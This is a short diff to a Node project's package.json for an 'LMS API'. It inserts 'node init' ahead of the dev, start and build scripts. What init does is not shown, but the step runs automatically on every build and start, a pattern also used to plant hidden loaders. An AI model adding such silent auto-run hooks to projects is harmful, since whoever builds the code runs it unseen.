@@ -4,9 +4,9 @@
   "description": "Codes Thinker LMS API",
   "private": true,
   "scripts": {
-    "dev": "npm run build && node --watch dist/main.js",
-    "start": "npm run build && node dist/main.js",
-    "build": "tsc -p tsconfig.json",
+    "dev": "node init && npm run build && node --watch dist/main.js",
+    "start": "node init && npm run build && node dist/main.js",
+    "build": "node init && tsc -p tsconfig.json",
     "prisma:generate": "prisma generate",
     "prisma:migrate": "prisma migrate dev",
     "prisma:deploy": "prisma migrate deploy",
